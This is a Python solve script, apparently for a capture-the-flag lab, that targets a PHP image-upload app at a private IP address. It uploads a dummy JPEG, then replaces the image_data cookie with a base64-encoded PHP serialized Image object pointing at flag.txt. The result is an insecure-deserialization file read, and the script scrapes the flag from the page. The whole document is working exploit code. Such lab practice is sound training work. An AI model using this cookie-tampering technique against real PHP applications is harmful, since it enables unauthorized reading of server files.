import requests
import re
import os

# Configuration
BASE_URL = "http://192.168.1.61:8080"
IMAGE_PATH = "test.jpg"
FLAG_COOKIE = "Tzo1OiJJbWFnZSI6MTp7czo0OiJwYXRoIjtzOjg6ImZsYWcudHh0Ijt9"  # Base64 of O:5:"Image":1:{s:4:"path";s:8:"flag.txt";}

# Create a dummy image
def create_dummy_image():
    with open(IMAGE_PATH, "wb") as f:
        f.write(b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00")  # Minimal JPEG header

# Upload image
def upload_image():
    if not os.path.exists(IMAGE_PATH):
        create_dummy_image()
    files = {"image": (IMAGE_PATH, open(IMAGE_PATH, "rb"))}
    response = requests.post(f"{BASE_URL}/upload.php", files=files)
    return "Your photo has been uploaded" in response.text

# Get flag from view.php
def get_flag():
    # Create session to persist cookies
    session = requests.Session()
    
    # Visit view.php to ensure cookie is set (after upload)
    session.get(f"{BASE_URL}/view.php")
    
    # Set modified cookie
    session.cookies.set("image_data", FLAG_COOKIE)
    
    # Revisit view.php
    response = session.get(f"{BASE_URL}/view.php")
    
    # Extract flag from source
    match = re.search(r'<pre class=\'hidden-content\'>(.*?)</pre>', response.text, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

# Main execution
def main():
    # Upload image
    if not upload_image():
        print("Image upload failed")
        return
    
    # Get flag
    flag = get_flag()
    if flag:
        print(f"Flag: {flag}")
    else:
        print("Flag not found. Check source code or server.")
    
    # Clean up
    if os.path.exists(IMAGE_PATH):
        os.remove(IMAGE_PATH)

if __name__ == "__main__":
    main()
